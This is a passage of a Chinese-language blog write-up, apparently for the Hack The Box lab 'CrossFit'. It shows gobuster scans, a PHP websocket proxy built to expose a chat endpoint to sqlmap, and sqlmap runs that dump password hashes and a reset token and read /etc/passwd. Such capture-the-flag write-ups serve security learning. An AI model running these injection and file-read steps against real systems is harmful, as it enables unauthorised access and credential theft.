                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051102.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>member area是一个子域名，加hosts：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051103.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.232 employees.crossfit.htb crossfit.htb</span><br></pre></td></tr></table></figure>

<h2 id="employees-crossfit-htb"><a href="#employees-crossfit-htb" class="headerlink" title="employees.crossfit.htb"></a>employees.crossfit.htb</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051104.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>对两个系统目录扫描，没什么有用的：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.232/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404 -t 50</span><br><span class="line"></span><br><span class="line">/about-us.php         (Status: 200) [Size: 15733]</span><br><span class="line">/blog.php             (Status: 200) [Size: 15369]</span><br><span class="line">/classes.php          (Status: 200) [Size: 25946]</span><br><span class="line">/contact.php          (Status: 200) [Size: 8007]</span><br><span class="line">/css                  (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/css/]</span><br><span class="line">/elements.php         (Status: 200) [Size: 19654]</span><br><span class="line">/fonts                (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/fonts/]</span><br><span class="line">/img                  (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/img/]</span><br><span class="line">/images               (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/images/]</span><br><span class="line">/index.php            (Status: 200) [Size: 19041]</span><br><span class="line">/index.php            (Status: 200) [Size: 19041]</span><br><span class="line">/js                   (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/js/]</span><br><span class="line">/main.html            (Status: 200) [Size: 931]</span><br><span class="line">/readme.txt           (Status: 200) [Size: 410]</span><br><span class="line">/vendor               (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/vendor/]</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://employees.crossfit.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404 -t 50</span><br><span class="line"></span><br><span class="line">/css                  (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/css/]</span><br><span class="line">/index.php            (Status: 200) [Size: 4412]</span><br><span class="line">/index.php            (Status: 200) [Size: 4412]</span><br><span class="line">/js                   (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/js/]</span><br><span class="line">/vendor               (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/vendor/]</span><br></pre></td></tr></table></figure>

<h1 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h1><p>查看流量可以发现一个gym.crossfit.htb的websocket：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051105.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>这个域名同样加hosts，相关代码在ws.min.js里：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051106.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h2><p>加完hosts后访问，右下角有个聊天框，31秒自动消失：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051107.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>并且有一次性token，每次响应新token，下次请求使用：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051108.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="websocket-client"><a href="#websocket-client" class="headerlink" title="websocket-client"></a>websocket-client</h2><p>所以可以自己写一个client，枚举信息：</p>
<ul>
<li><a href="https://amphp.org/websocket-client/" target="_blank" rel="noopener">https://amphp.org/websocket-client/</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer require amphp&#x2F;websocket-client</span><br><span class="line"></span><br><span class="line">php -S 0.0.0.0:7777</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051109.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051110.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ws-min-js"><a href="#ws-min-js" class="headerlink" title="ws.min.js"></a>ws.min.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateScroll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> e = <span class="built_in">document</span>.getElementById(<span class="string">'chats'</span>);</span><br><span class="line">  e.scrollTop = e.scrollHeight</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> token,</span><br><span class="line">ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://gym.crossfit.htb/ws/'</span>),</span><br><span class="line">pingTimeout = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span>&#123;</span><br><span class="line">  ws.close(),</span><br><span class="line">  $(<span class="string">'.chat-main'</span>).remove()</span><br><span class="line">&#125;, <span class="number">31000</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_availability</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Object</span>;</span><br><span class="line">  s.message = <span class="string">'available'</span>,</span><br><span class="line">  s.params = <span class="built_in">String</span>(e),</span><br><span class="line">  s.token = token,</span><br><span class="line">  ws.send(<span class="built_in">JSON</span>.stringify(s))</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">'.chat-content'</span>).slideUp(),</span><br><span class="line">$(<span class="string">'.hide-chat-box'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  $(<span class="string">'.chat-content'</span>).slideUp()</span><br><span class="line">&#125;),</span><br><span class="line">$(<span class="string">'.show-chat-box'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  $(<span class="string">'.chat-content'</span>).slideDown(),</span><br><span class="line">  updateScroll()</span><br><span class="line">&#125;),</span><br><span class="line">$(<span class="string">'.close-chat-box'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  $(<span class="string">'.chat-main'</span>).remove()</span><br><span class="line">&#125;),</span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;,</span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="string">'ping'</span> === e.data ? (ws.send(<span class="string">'pong'</span>), clearTimeout(pingTimeout)) : (response = <span class="built_in">JSON</span>.parse(e.data), answer = response.message, answer.startsWith(<span class="string">'Hello!'</span>) &amp;&amp; $(<span class="string">'#ws'</span>).show(), token = response.token, $(<span class="string">'#chat-messages'</span>).append(<span class="string">'&lt;li class="receive-msg float-left mb-2"&gt;&lt;div class="receive-msg-desc float-left ml-2"&gt;&lt;p class="msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded"&gt;'</span> + answer + <span class="string">'&lt;/p&gt;&lt;/div&gt;&lt;/li&gt;'</span>), updateScroll())</span><br><span class="line">&#125;,</span><br><span class="line">$(<span class="string">'#sendmsg'</span>).on(<span class="string">'keypress'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">13</span> === e.which) &#123;</span><br><span class="line">    $(<span class="keyword">this</span>).attr(<span class="string">'disabled'</span>, <span class="string">'disabled'</span>);</span><br><span class="line">    <span class="keyword">var</span> s = $(<span class="string">'#sendmsg'</span>).val();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> !== s) &#123;</span><br><span class="line">      $(<span class="string">'#chat-messages'</span>).append(<span class="string">'&lt;li class="send-msg float-right mb-2"&gt;&lt;p class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded"&gt;'</span> + s + <span class="string">'&lt;/p&gt;&lt;/li&gt;'</span>);</span><br><span class="line">      <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="built_in">Object</span>;</span><br><span class="line">      t.message = s,</span><br><span class="line">      t.token = token,</span><br><span class="line">      ws.send(<span class="built_in">JSON</span>.stringify(t)),</span><br><span class="line">      $(<span class="string">'#sendmsg'</span>).val(<span class="string">''</span>),</span><br><span class="line">      $(<span class="keyword">this</span>).removeAttr(<span class="string">'disabled'</span>),</span><br><span class="line">      updateScroll()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="websocket-client-php"><a href="#websocket-client-php" class="headerlink" title="websocket-client.php"></a>websocket-client.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Amp</span>\<span class="title">Websocket</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">Amp\Loop::run(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    $connection = <span class="keyword">yield</span> Client\connect(<span class="string">'ws://gym.crossfit.htb/ws/'</span>);</span><br><span class="line">    $message = <span class="keyword">yield</span> $connection-&gt;receive();</span><br><span class="line">    $payload = <span class="keyword">yield</span> $message-&gt;buffer();</span><br><span class="line">    $token   = json_decode($payload, <span class="keyword">true</span>)[<span class="string">"token"</span>];</span><br><span class="line">    $check   = json_encode(<span class="keyword">array</span>(<span class="string">'message'</span> =&gt; <span class="string">'available'</span>, <span class="string">'params'</span> =&gt; $_GET[<span class="string">'id'</span>], <span class="string">'token'</span> =&gt; $token));</span><br><span class="line">    <span class="keyword">yield</span> $connection-&gt;send($check);</span><br><span class="line">    $message = <span class="keyword">yield</span> $connection-&gt;receive();</span><br><span class="line">    $payload = <span class="keyword">yield</span> $message-&gt;buffer();</span><br><span class="line">    header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">    printf($payload);</span><br><span class="line"></span><br><span class="line">    $connection-&gt;close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>websocket获取信息也是通过数据库，因此可以进行sql注入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!'</span><br><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10</span><br></pre></td></tr></table></figure>

<h2 id="dbs"><a href="#dbs" class="headerlink" title="dbs"></a>dbs</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10 --dbs</span><br><span class="line"></span><br><span class="line">available databases [3]:</span><br><span class="line">[*] crossfit</span><br><span class="line">[*] employees</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure>

<h2 id="employees"><a href="#employees" class="headerlink" title="employees"></a>employees</h2><p>两张表，一张是账号信息，一张是密码重置token：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees --tables</span><br><span class="line"></span><br><span class="line">Database: employees</span><br><span class="line">[2 tables]</span><br><span class="line">+----------------+</span><br><span class="line">| employees      |</span><br><span class="line">| password_reset |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure>

<h2 id="employees-table"><a href="#employees-table" class="headerlink" title="employees table"></a>employees table</h2><p><a href="mailto:david.palmer@crossfit.htb">david.palmer@crossfit.htb</a>是administrator：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees -T employees --dump</span><br><span class="line"></span><br><span class="line">Database: employees</span><br><span class="line">Table: employees</span><br><span class="line">[4 entries]</span><br><span class="line">+----+-----------------------------+---------------+------------------------------------------------------------------+</span><br><span class="line">| id | email                       | username      | password                                                         |</span><br><span class="line">+----+-----------------------------+---------------+------------------------------------------------------------------+</span><br><span class="line">| 1  | david.palmer@crossfit.htb   | administrator | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 |</span><br><span class="line">| 2  | will.smith@crossfit.htb     | wsmith        | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 |</span><br><span class="line">| 3  | maria.williams@crossfit.htb | mwilliams     | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c |</span><br><span class="line">| 4  | jack.parker@crossfit.htb    | jparker       | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 |</span><br><span class="line">+----+-----------------------------+---------------+------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="password-reset-table"><a href="#password-reset-table" class="headerlink" title="password_reset table"></a>password_reset table</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees -T password_reset --dump</span><br><span class="line"></span><br><span class="line">Database: employees</span><br><span class="line">Table: password_reset</span><br><span class="line">[0 entries]</span><br><span class="line">+-------+-------+---------+</span><br><span class="line">| token | email | expires |</span><br><span class="line">+-------+-------+---------+</span><br><span class="line">+-------+-------+---------+</span><br></pre></td></tr></table></figure>

<h2 id="password-reset"><a href="#password-reset" class="headerlink" title="password_reset"></a>password_reset</h2><p>尝试去reset administrator密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051111.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>表里可以得到token，但现在不知道使用格式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees -T password_reset --dump --fresh-queries</span><br><span class="line"></span><br><span class="line">Database: employees</span><br><span class="line">Table: password_reset</span><br><span class="line">[1 entry]</span><br><span class="line">+------------------------------------------------------------------+---------------------------+---------------------+</span><br><span class="line">| token                                                            | email                     | expires             |</span><br><span class="line">+------------------------------------------------------------------+---------------------------+---------------------+</span><br><span class="line">| 5fda7b56a8c5b514a528fc02fcf583584436aa28b7eafe2db0790c36a805a284 | david.palmer@crossfit.htb | 2021-05-11 08:54:10 |</span><br><span class="line">+------------------------------------------------------------------+---------------------------+---------------------+</span><br></pre></td></tr></table></figure>

<h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><p>需要继续枚举，尝试sql读文件(非常慢),opembsd相关配置文件：</p>
<ul>
<li><a href="https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current" target="_blank" rel="noopener">https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current</a></li>
</ul>
<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/etc/passwd"</span><br><span class="line"></span><br><span class="line">root:*:0:0:Charlie &amp;:/root:/bin/ksh</span><br><span class="line">daemon:*:1:1:The devil himself:/root:/sbin/nologin</span><br><span class="line">operator:*:2:5:System &amp;:/operator:/sbin/nologin</span><br><span class="line">bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin</span><br><span class="line">build:*:21:21:base and xenocara build:/var/empty:/bin/ksh</span><br><span class="line">sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin</span><br><span class="line">_portmap:*:28:28:portmap:/var/empty:/sbin/nologin</span><br><span class="line">_identd:*:29:29:identd:/var/empty:/sbin/nologin</span><br><span class="line">_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin</span><br><span class="line">_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin</span><br><span class="line">_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin</span><br><span class="line">_x11:*:35:35:X Server:/var/empty:/sbin/nologin</span><br><span class="line">_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin</span><br><span class="line">_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin</span><br><span class="line">_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin</span><br><span class="line">_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin</span><br><span class="line">_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin</span><br><span class="line">_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin</span><br><span class="line">_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin</span><br><span class="line">_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin</span><br><span class="line">_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin</span><br><span class="line">www:*:67:67:HTTP Server:/var/www:/sbin/nologin</span><br><span class="line">_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin</span><br><span class="line">_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin</span><br><span class="line">_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin</span><br><span class="line">_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin</span><br><span class="line">_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin</span><br><span class="line">_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin</span><br><span class="line">_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin</span><br><span class="line">_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin</span><br><span class="line">_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_file:*:104:104:file privsep:/var/empty:/sbin/nologin</span><br><span class="line">_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin</span><br><span class="line">_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin</span><br><span class="line">_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin</span><br><span class="line">_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin</span><br><span class="line">_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin</span><br><span class="line">_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin</span><br><span class="line">nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin</span><br><span class="line">_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin</span><br><span class="line">lucille:*:1002:1002:,,,:/home/lucille:/bin/csh</span><br><span class="line">node:*:1003:1003::/home/node:/bin/ksh</span><br><span class="line">_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin</span><br><span class="line">_redis:*:686:686:redis account:/var/redis:/sbin/nologin</span><br><span class="line">david:*:1004:1004:,,,:/home/david:/bin/csh</span><br><span class="line">john:*:1005:1005::/home/john:/bin/csh</span><br><span class="line">ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin</span><br></pre></td></tr></table></figure>

<h2 id="etc-login-conf"><a href="#etc-login-conf" class="headerlink" title="/etc/login.conf"></a>/etc/login.conf</h2><p>根据配置文件，使用有yubikey：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 